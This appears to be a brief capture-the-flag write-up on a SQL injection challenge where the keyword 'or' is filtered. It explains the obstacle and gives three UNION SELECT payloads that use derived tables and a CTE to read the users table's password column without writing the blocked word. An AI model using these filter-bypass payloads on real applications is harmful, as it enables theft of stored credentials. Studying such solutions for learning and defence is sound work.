The whole trick here is that we can't simply ```UNION SELECT id, password FROM users``` because the keyword "or" is blocked.
So we need a way to UNION SELECT the first query with another table that has 2 rows and one of them is password.

I did it like this:

```4 UNION SELECT id,login FROM (SELECT 4 as id, 2, 3 as login from users UNION SELECT * FROM users)```

```4 UNION SELECT id,pass FROM (WITH susers(id,login,pass) AS (SELECT * FROM users) SELECT id,pass FROM susers WHERE id in (1))```


Bonus:
```4 UNION SELECT id,pass FROM (SELECT 4 as id, 2, 3 as pass from users UNION SELECT * FROM users WHERE id in (1)) WHERE id in (1)```